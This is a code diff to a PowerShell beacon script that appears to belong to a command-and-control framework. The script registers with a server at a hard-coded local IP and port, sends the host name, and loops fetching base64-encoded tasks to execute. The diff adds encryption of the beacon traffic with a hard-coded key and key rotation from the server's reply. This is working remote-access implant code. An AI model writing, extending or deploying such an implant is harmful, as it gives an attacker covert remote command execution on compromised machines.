@@ -69,19 +69,28 @@ $ip   = "192.168.0.28"
 $port = "9090"
 ## secrets.token_hex(32)
 ## secrets.token_urlsafe(32)
-$key  = 'SP8Y4Uv9KRtnoJqefyBolUHjtm96PdG28JVD2V3PAeo='
+$key  = 'J5H12eEaThLIwpjSaqM6XHpnUcrJqZgvzfno8TQIWoM='
 $n    = 2
 $name = ""
 $code = ""
 
 $hname = [System.Net.Dns]::GetHostName()
+$hname  = Encrypt-String $key $hname
 $type  = "powershell"
+$type  = Encrypt-String $key $type
 $regl  = ("http" + ':' + "//$ip" + ':' + "$port/beacon/register")
 $data  = @{
     name = "$hname" 
     type = "$type"
     }
-$name  = (Invoke-WebRequest -UseBasicParsing -Uri $regl -Body $data -Method 'POST').Content
+$ret  = (Invoke-WebRequest -UseBasicParsing -Uri $regl -Body $data -Method 'POST').Content
+$ret = Decrypt-String $key $ret
+$ret = $ret.split()
+$flag = $ret[0]
+if ($flag -eq "VALID"){
+    $name = $ret[1]
+    $key = $ret[2]
+}
 sleep $n
 
 $resultl = ("http" + ':' + "//$ip" + ':' + "$port/results/")
@@ -103,10 +112,10 @@ for (;;){
         Write-Host $task
         $task = $task.split()
         $flag = $task[0]
-        $taskId = $task[1]
         
         if ($flag -eq "VALID"){
             
+            $taskId = $task[1]
             $decoded_command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($task[2]))
             $decoded_command = $decoded_command.split()
             $command = $decoded_command[0]
